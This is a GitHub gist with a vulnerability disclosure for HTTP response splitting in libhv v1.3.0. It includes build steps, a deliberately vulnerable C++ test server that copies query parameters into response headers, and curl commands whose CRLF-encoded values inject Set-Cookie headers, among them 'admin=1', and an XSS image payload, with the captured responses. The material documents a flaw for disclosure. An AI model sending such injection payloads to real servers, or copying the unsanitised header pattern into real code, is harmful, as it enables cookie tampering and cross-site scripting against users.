
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dellalibera](https://avatars.githubusercontent.com/u/43420907?s=64&v=4)](/dellalibera)

# [dellalibera](/dellalibera)/**[01\_HTTP\_Response\_Splitting\_libhv@v1.3.0.md](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b)** Secret

Created
May 16, 2023 10:58

Show Gist options

* [Download ZIP](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b/archive/a110b8e09d3e7a9e80e1eb46beb8709af331cdc7.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b.js&quot;&gt;&lt;/script&gt;
* Save dellalibera/2be265b56b7b3b00de1a777b9dec0c7b to your computer and use it in GitHub Desktop.

[Code](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b)
[Revisions
1](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b.js&quot;&gt;&lt;/script&gt;

Save dellalibera/2be265b56b7b3b00de1a777b9dec0c7b to your computer and use it in GitHub Desktop.

[Download ZIP](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b/archive/a110b8e09d3e7a9e80e1eb46beb8709af331cdc7.zip)

HTTP Response Splitting in libhv@v1.3.0

 [Raw](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b/raw/a110b8e09d3e7a9e80e1eb46beb8709af331cdc7/01_HTTP_Response_Splitting_libhv%40v1.3.0.md)

[**01\_HTTP\_Response\_Splitting\_libhv@v1.3.0.md**](#file-01_http_response_splitting_libhv-v1-3-0-md)

# Information

**Project:** `libhv`

**Tested Version:** `v1.3.0` (commit `579938146ff0cd99d379c038bea80d3241c5bc36`)

**Github Repository:** [`https://github.com/ithewei/libhv`](https://github.com/ithewei/libhv)

## Details

`libhv` is vulnerable to **HTTP Response Splitting** when untrusted user input is used to build headers values. An attacker can add the `\r\n` (carriage return line feeds) characters to end the HTTP response headers and inject malicious content, like for example additional headers or new response body, leading to a potential XSS vulnerability.

References about this vulnerability and its impact:

* <https://owasp.org/www-community/attacks/HTTP_Response_Splitting>
* <https://cwe.mitre.org/data/definitions/113.html>

References to similar issues affecting other projects:

* <https://security.snyk.io/vuln/SNYK-SWIFT-APPLESWIFTNIO-3105796>

## Setup

Install and build the project <https://github.com/ithewei/libhv#%EF%B8%8F-build>

```
git clone https://github.com/ithewei/libhv.git
cd libhv
mkdir build
cd build
cmake ..
cmake --build .

```
## PoC

The PoC demonstrates how it's possible to add arbitrary headers and response body if user controlled values are used to set the headers value.

* paste the `http_server_test.cpp` content under <https://github.com/ithewei/libhv/blob/master/examples/http_server_test.cpp>
* start the server

```
cmake --build .
./bin/http_server_test

```

* run the following `curl` commands to observe the response (or directly open the links in the browser to see the xss alert)

```
curl -i -X GET "http://localhost:8080/test1?name=test%0d%0aSet-Cookie:foo%3Dbar%0d%0aContent-Type:text/html%0d%0a%0a%3Cimg+src%3dx+onerror%3dalert(%22hello%22)+/%3E%0d%0a"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 39
Content-Type: text/plain
Date: Tue, 16 May 2023 10:28:06 GMT
MyHeader: User-test
Set-Cookie:foo=bar
Content-Type:text/html

<img src=x onerror=alert("hello") />

```
```
curl -i -X GET "http://localhost:8080/test2?location=test1%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1"
HTTP/1.1 301 Moved Permanently
Connection: keep-alive
Content-Length: 0
Date: Tue, 16 May 2023 10:28:19 GMT
Location: test1
Foo: Bar
Set-Cookie:admin=1
Server: httpd/1.23.5.16

```
## Impact

If untrusted user input is placed in header values, a malicious user could inject additional headers or new response body, leading to a potential XSS vulnerability or a number of other issues.

## Author

Alessio Della Libera

 [Raw](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b/raw/a110b8e09d3e7a9e80e1eb46beb8709af331cdc7/http_server_test.cpp)

[**http\_server\_test.cpp**](#file-http_server_test-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include "HttpServer.h" |
| --- | --- |
|  |  |
|  | using namespace hv; |
|  |  |
|  |  |
|  | int main(int argc, char\*\* argv) { |
|  | HV\_MEMCHECK; |
|  |  |
|  | int port = 8080; |
|  |  |
|  | HttpService router; |
|  |  |
|  | // curl -i -X GET "http://localhost:8080/test1?name=test%0d%0aSet-Cookie:foo%3Dbar%0d%0aContent-Type:text/html%0d%0a%0a%3Cimg+src%3dx+onerror%3dalert(%22hello%22)+/%3E%0d%0a" |
|  | router.GET("/test1", [](HttpRequest\* req, HttpResponse\* resp) { |
|  | resp->headers["MyHeader"] = "User-" + req->query\_params["name"]; |
|  | return resp->String("Hello world!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"); |
|  | }); |
|  |  |
|  |  |
|  | // curl -i -X GET "http://localhost:8080/test2?location=test1%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1" |
|  | router.GET("/test2", [](HttpRequest\* req, HttpResponse\* resp) { |
|  | auto location = req->query\_params["location"]; |
|  | return resp->Redirect(location, HTTP\_STATUS\_MOVED\_PERMANENTLY); |
|  | }); |
|  |  |
|  |  |
|  | http\_server\_t server; |
|  | server.service = &router; |
|  | server.port = port; |
|  |  |
|  | http\_server\_run(&server, 0); |
|  |  |
|  | while (getchar() != '\n'); |
|  | http\_server\_stop(&server); |
|  | return 0; |
|  | } |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F2be265b56b7b3b00de1a777b9dec0c7b)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

